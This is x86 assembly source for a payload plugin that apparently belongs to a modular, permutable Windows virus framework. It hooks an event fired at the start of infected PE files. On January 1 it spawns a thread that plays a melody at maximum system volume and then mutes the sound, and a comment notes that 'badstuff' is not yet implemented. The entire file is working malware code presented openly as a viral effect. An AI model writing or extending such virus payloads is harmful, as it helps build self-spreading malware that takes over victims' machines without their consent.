   ; EFFECT
   ; ~~~~~~
   ; - viral effect: play melody via sb with max volume

   include                 music.inc
   include                 k32man.inc
   include                 pentry.inc
   include                 volume.inc
   include                 thread.inc

   include                 plugin.inc
                           PLUGIN_START    EFFECT, W32R3, PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, checktime
                           hookevent EV_EFFECT_RUN, effect
                           hookevent EV_EFFECT_RUN_REAL, effect_real
                           stc
                           retn

   checktime:              pusha

                           sub     esp, 16
                           push    esp
                           callX   GetSystemTime
                           mov     ah, [esp+2]     ; month
                           mov     al, [esp+6]     ; day
                           add     esp, 16

                           cmp     ax, 0101h       ; january, 1
                           je      __run

   __skip:                 popa
                           stc     ; keep event
                           retn

   __run:                  event   EV_EFFECT_RUN
                           jmp     __skip

   effect:                 pusha

                           pusho   effect_real
                           pop     ecx
                           event   EV_THREAD_NEW

                           popa
                           clc
                           retn

   effect_real:            pusha

                           event   EV_MUSIC_INIT   ; unpack into memory
                           ; ecx<--music length, [ms]

   IFNDEF   DEBUG
                           mov     esi, 0FFFFh     ; fuck'em! max volume.
                           event   EV_VOLUME_SET
   ENDIF

                           push    ecx     ; music length in [ms]
                           callX   Sleep   ; badstuff not implemented, yet

                           event   EV_MUSIC_DONE   ; free memory

   IFNDEF   DEBUG
                           xor     esi, esi        ; zero volume
                           event   EV_VOLUME_SET
   ENDIF

                           popa
                           clc
                           retn

                           PLUGIN_END
